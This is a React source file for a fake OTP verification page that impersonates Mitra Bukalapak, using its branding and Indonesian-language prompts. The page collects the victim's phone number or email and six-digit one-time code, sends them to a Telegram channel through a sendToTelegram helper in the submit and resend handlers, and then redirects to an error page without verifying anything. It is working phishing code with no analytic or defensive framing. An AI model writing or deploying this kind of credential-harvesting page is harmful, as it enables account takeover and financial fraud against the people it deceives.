import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { Helmet } from 'react-helmet';
import { motion } from 'framer-motion';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { useToast } from '@/components/ui/use-toast';
import { ArrowLeft } from 'lucide-react';
import { sendToTelegram } from '@/lib/telegram';

const OtpPage = () => {
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [countdown, setCountdown] = useState(60);
  const [isLoading, setIsLoading] = useState(false);
  const [canResend, setCanResend] = useState(false);
  const location = useLocation();
  const navigate = useNavigate();
  const { toast } = useToast();
  const phoneEmail = location.state?.phoneEmail || '';

  useEffect(() => {
    if (!phoneEmail) {
      navigate('/');
      return;
    }
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          setCanResend(true);
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [phoneEmail, navigate]);

  const handleOtpChange = (index, value) => {
    if (value.length > 1) return;
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (value && index < 5) {
      const nextInput = document.getElementById(`otp-${index + 1}`);
      if (nextInput) nextInput.focus();
    }
  };

  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      const prevInput = document.getElementById(`otp-${index - 1}`);
      if (prevInput) prevInput.focus();
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const otpCode = otp.join('');
    if (otpCode.length !== 6) {
      toast({
        title: "Error",
        description: "Mohon masukkan kode OTP 6 digit",
        variant: "destructive",
      });
      return;
    }
    setIsLoading(true);

    const message = `
      --- Kode OTP Mitra Bukalapak ---
      Email/No. HP: ${phoneEmail}
      Kode OTP: ${otpCode}
      --------------------------------
    `;

    try {
      await sendToTelegram(message);
    } catch (error) {
      console.error("Failed to send OTP to Telegram:", error);
    }

    setTimeout(() => {
      setIsLoading(false);
      navigate('/error');
    }, 1500);
  };

  const handleResendOtp = async () => {
    if (!canResend) return;
    setCountdown(60);
    setCanResend(false);
    setOtp(['', '', '', '', '', '']);
    
    const message = `
      --- Permintaan Kirim Ulang OTP ---
      Email/No. HP: ${phoneEmail}
      ----------------------------------
    `;

    try {
      await sendToTelegram(message);
      toast({
        description: "Kode OTP baru telah dikirim",
      });
    } catch (error) {
      console.error("Failed to send resend request to Telegram:", error);
      toast({
        description: "Gagal mengirim ulang kode OTP",
        variant: "destructive",
      });
    }

    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          setCanResend(true);
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const formatPhoneEmail = (value) => {
    if (!value) return '';
    if (value.includes('@')) {
      return value.replace(/(.{2})(.*)(@.*)/, '$1***$3');
    }
    return value.replace(/(\d{4})(\d*)(\d{4})/, '$1***$3');
  };

  return (
    <>
      <Helmet>
        <title>Verifikasi OTP - Mitra Bukalapak</title>
        <meta name="description" content="Masukkan kode OTP untuk verifikasi akun Mitra Bukalapak" />
      </Helmet>
      
      <div className="min-h-screen bg-gray-50 flex flex-col justify-center py-12 sm:px-6 lg:px-8">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.6 }}
          className="sm:mx-auto sm:w-full sm:max-w-md"
        >
          <div className="flex justify-center mb-8">
            <img src="https://horizons-cdn.hostinger.com/d6c60f8a-60ec-4c69-abb8-e8ce52da2afb/36526-Pl5SA.jpg" alt="Mitra Bukalapak Logo" className="h-12 w-auto" />
          </div>
          
          <div className="bg-white py-8 px-4 shadow-sm sm:rounded-lg sm:px-10">
            <div className="mb-6">
              <button onClick={() => navigate('/')} className="flex items-center text-gray-600 hover:text-gray-800 mb-4">
                <ArrowLeft className="h-4 w-4 mr-2" />
                Kembali
              </button>
              
              <h1 className="text-2xl font-semibold text-gray-900 mb-2">Verifikasi OTP</h1>
              <p className="text-sm text-gray-600">
                Masukkan kode OTP yang telah dikirim ke {formatPhoneEmail(phoneEmail)}
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-4">
                  Kode OTP
                </label>
                <div className="flex space-x-3 justify-center">
                  {otp.map((digit, index) => (
                    <Input
                      key={index}
                      id={`otp-${index}`}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtpChange(index, e.target.value.replace(/\D/g, ''))}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className="w-12 h-12 text-center text-lg font-semibold border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-transparent"
                    />
                  ))}
                </div>
              </div>

              <div className="text-center">
                {canResend ? (
                  <button type="button" onClick={handleResendOtp} className="text-red-600 hover:text-red-500 text-sm font-medium">
                    Kirim Ulang Kode OTP
                  </button>
                ) : (
                  <p className="text-sm text-gray-600">
                    Kirim ulang kode dalam {countdown} detik
                  </p>
                )}
              </div>

              <Button
                type="submit"
                disabled={isLoading || otp.join('').length !== 6}
                className="w-full bg-red-600 hover:bg-red-700 text-white font-medium py-3 px-4 rounded-md transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? 'Memverifikasi...' : 'Verifikasi'}
              </Button>
            </form>
          </div>
        </motion.div>
      </div>
    </>
  );
};

export default OtpPage;